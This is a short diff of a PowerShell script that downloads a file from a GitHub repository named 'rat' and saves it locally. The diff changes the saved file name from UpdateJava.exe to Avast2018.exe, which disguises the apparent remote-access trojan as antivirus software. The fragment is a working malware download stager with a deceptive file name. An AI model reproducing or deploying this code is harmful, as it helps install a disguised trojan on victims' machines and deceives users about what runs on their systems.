@@ -24,7 +24,7 @@ if ($f3) {
 }
 
 $url = "https://github.com/itarare/rat/raw/master/Java.0000"
-$output = "c:\Update\UpdateJava.exe"
+$output = "c:\Update\Avast2018.exe"
 $start_time = Get-Date
 
 Invoke-WebRequest -Uri $url -OutFile $output
